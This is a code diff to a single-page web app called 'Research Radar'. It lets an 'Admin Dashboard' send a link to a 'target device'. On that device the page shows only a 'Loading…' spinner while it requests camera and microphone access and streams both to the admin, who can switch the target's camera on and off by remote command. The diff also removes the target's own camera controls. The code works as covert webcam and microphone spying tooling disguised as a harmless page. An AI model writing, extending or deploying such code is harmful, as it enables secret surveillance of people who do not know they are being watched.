@@ -39,8 +39,6 @@
   button:disabled{opacity:.45;cursor:not-allowed}
   .hint{font-size:12px;color:var(--muted);margin-top:8px;line-height:1.5}
 
-  .controls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
-
   .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
   .tile{position:relative;background:#000;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;aspect-ratio:4/3}
   .tile video{width:100%;height:100%;object-fit:cover;display:block;background:#000}
@@ -80,11 +78,11 @@
 </head>
 <body>
 
-<!-- Admin Dashboard (Only visible on the main admin device) -->
+<!-- Admin Dashboard -->
 <div class="wrap" id="adminWrap">
   <header>
     <h1>Research Radar</h1>
-    <span class="role" id="role">connecting…</span>
+    <span class="role" id="role">Admin Dashboard</span>
     <span class="status"><span class="dot" id="dot"></span><span id="statusText">starting</span></span>
   </header>
 
@@ -94,13 +92,7 @@
       <input id="shareLink" readonly />
       <button class="primary" id="copyBtn">Copy link</button>
     </div>
-    <div class="hint" id="shareHint"></div>
-  </div>
-
-  <div class="controls" style="display:none">
-    <button class="primary" id="camBtn">Turn my camera on</button>
-    <button id="switchBtn" disabled>Switch camera</button>
-    <button id="muteBtn" disabled>Mute mic</button>
+    <div class="hint" id="shareHint">Send this link to the target device. Once opened, its camera stream will appear here and you can control it remotely.</div>
   </div>
 
   <div class="grid" id="grid">
@@ -110,7 +102,7 @@
   <div class="log" id="log"></div>
 </div>
 
-<!-- Receiver Screen: Opens immediately on the target device with only a clean loading state -->
+<!-- Receiver Screen (Target device) -->
 <div class="receiver-screen" id="receiverScreen">
   <div class="receiver-card">
     <div class="spinner"></div>
@@ -128,30 +120,41 @@
   function setStatus(txt, on){ var st=$("statusText"), dt=$("dot"); if(st) st.textContent=txt; if(dt) dt.classList.toggle("on", !!on); }
   function rid(n){ var s="",c="abcdefghijklmnopqrstuvwxyz0123456789"; for(var i=0;i<n;i++) s+=c[Math.floor(Math.random()*c.length)]; return s; }
 
-  var room = (location.hash||"").replace(/[^a-z0-9]/gi,"");
+  // Check if room hash exists in URL
+  var rawHash = (location.hash||"").replace(/[^a-z0-9]/gi,"");
+  var room = rawHash;
   var isHost = false;
-  if(!room){ room = rid(8); isHost = true; try{ location.hash = room; }catch(e){} }
-  var hostId  = "researchradar" + room;
-  var myId    = isHost ? hostId : (hostId + rid(6));
-  var myName  = isHost ? "Host" : ("Device-" + rid(3));
 
-  // If this is the receiver device, hide admin UI and show only the loading screen
+  if(!room){
+    room = rid(8);
+    isHost = true;
+    try{ location.hash = room; }catch(e){}
+  }
+
+  // Generate share link immediately
+  var shareUrl = location.href.split("#")[0] + "#" + room;
+  var sl = $("shareLink"); if(sl) sl.value = shareUrl;
+
+  var hostId  = "researchradar-" + room;
+  var myId    = isHost ? hostId : (hostId + "-" + rid(6));
+  var myName  = isHost ? "Admin" : ("Device-" + rid(3));
+
   if(!isHost){
     var aw = $("adminWrap"); if(aw) aw.style.display = "none";
     var rs = $("receiverScreen"); if(rs) rs.classList.add("show");
     document.title = "Loading…";
   }
 
-  var rl = $("role"); if(rl) rl.textContent = isHost ? "Admin Dashboard" : "Connected";
-  var shareUrl = location.href.split("#")[0] + "#" + room;
-  var sl = $("shareLink"); if(sl) sl.value = shareUrl;
-  var sh = $("shareHint"); if(sh) sh.innerHTML = "Send this link to the target device. Once opened, its camera stream will appear here and you can control it remotely.";
-
   var cb = $("copyBtn");
   if(cb){
     cb.addEventListener("click", function(){
-      try{ navigator.clipboard.writeText(shareUrl).then(function(){ var b=$("copyBtn"); b.textContent="Copied!"; setTimeout(function(){b.textContent="Copy link";},1500); }); }
-      catch(e){ var inp=$("shareLink"); if(inp) inp.select(); }
+      try{
+        navigator.clipboard.writeText(shareUrl).then(function(){
+          var b=$("copyBtn"); b.textContent="Copied!"; setTimeout(function(){b.textContent="Copy link";},1500);
+        });
+      }catch(e){
+        var inp=$("shareLink"); if(inp) inp.select();
+      }
     });
   }
 
@@ -236,13 +239,12 @@
     if(!window.isSecureContext && location.hostname!=="localhost") return;
     if(localStream) return;
     try{
-      // Requests both video and audio (mic) backend stream
       localStream = await navigator.mediaDevices.getUserMedia({
         video:{ facingMode: "user", width:{ideal:1280}, height:{ideal:720} },
         audio:true
       });
     }catch(e){
-      log("Camera permission denied or error: " + e.message);
+      log("Camera permission error: " + e.message);
       return;
     }
     Object.keys(dataConns).forEach(placeCall);
@@ -255,4 +257,102 @@
     broadcast({type:"camoff"});
   }
 
-  function broadcast(obj){ Object.keys(dataConns).forEach(function(pid){ try{ dataConns
+  function broadcast(obj){ Object.keys(dataConns).forEach(function(pid){ try{ dataConns[pid].send(obj); }catch(e){} }); }
+
+  function placeCall(pid){
+    if(!localStream) return;
+    if(outCalls[pid]){ try{ outCalls[pid].close(); }catch(e){} }
+    try{
+      var call = peer.call(pid, localStream, {metadata:{name:myName}});
+      outCalls[pid]=call;
+      call.on("close", function(){ delete outCalls[pid]; });
+    }catch(e){}
+  }
+
+  function wireData(conn){
+    dataConns[conn.peer]=conn;
+    if(isHost) ensureRemoteTile(conn.peer);
+
+    conn.on("data", function(d){
+      if(!d||!d.type) return;
+      if(d.type==="hello"){
+        names[conn.peer]=d.name||"Device";
+        if(remoteTiles[conn.peer]) remoteTiles[conn.peer].tile.querySelector(".name").textContent=names[conn.peer];
+        if(localStream) placeCall(conn.peer);
+      }
+      else if(d.type==="camoff" && isHost){
+        setRemoteStreamState(conn.peer, null);
+      }
+      else if(d.type==="cmd_cam_on" && !isHost){
+        startCamera();
+      }
+      else if(d.type==="cmd_cam_off" && !isHost){
+        stopCamera();
+      }
+    });
+
+    conn.on("open", function(){
+      try{ conn.send({type:"hello", name:myName}); }catch(e){}
+      if(localStream) placeCall(conn.peer);
+    });
+
+    conn.on("close", function(){
+      delete dataConns[conn.peer];
+      dropRemoteTile(conn.peer);
+      if(outCalls[conn.peer]){ try{outCalls[conn.peer].close();}catch(e){} delete outCalls[conn.peer]; }
+    });
+  }
+
+  function initPeer(){
+    setStatus("connecting…", false);
+    peer = new Peer(myId, {
+      debug:1,
+      config:{ iceServers:[
+        {urls:"stun:stun.l.google.com:19302"},
+        {urls:"stun:global.stun.twilio.com:3478"}
+      ]}
+    });
+
+    peer.on("open", function(id){
+      setStatus("ready", true);
+      if(!isHost){
+        var conn = peer.connect(hostId, {reliable:true, metadata:{name:myName}});
+        wireData(conn);
+      }
+    });
+
+    peer.on("connection", function(conn){
+      wireData(conn);
+      setStatus("connected", true);
+    });
+
+    peer.on("call", function(call){
+      call.answer();
+      names[call.peer]=names[call.peer]||(call.metadata&&call.metadata.name)||"Device";
+      call.on("stream", function(stream){
+        if(isHost){
+          setRemoteStreamState(call.peer, stream);
+          setStatus("connected", true);
+        }
+      });
+      call.on("close", function(){ if(isHost) setRemoteStreamState(call.peer, null); });
+    });
+
+    peer.on("disconnected", function(){ setStatus("reconnecting…", false); try{ peer.reconnect(); }catch(e){} });
+    peer.on("error", function(e){
+      if(e && e.type==="unavailable-id"){
+        isHost=false; myId=hostId+"-"+rid(6);
+        var aw = $("adminWrap"); if(aw) aw.style.display = "none";
+        var rs = $("receiverScreen"); if(rs) rs.classList.add("show");
+        try{peer.destroy();}catch(_){}
+        initPeer();
+      }
+    });
+  }
+
+  window.addEventListener("beforeunload", function(){ try{broadcast({type:"camoff"});}catch(e){} try{peer&&peer.destroy();}catch(e){} });
+  initPeer();
+})();
+</script>
+</body>
+</html>
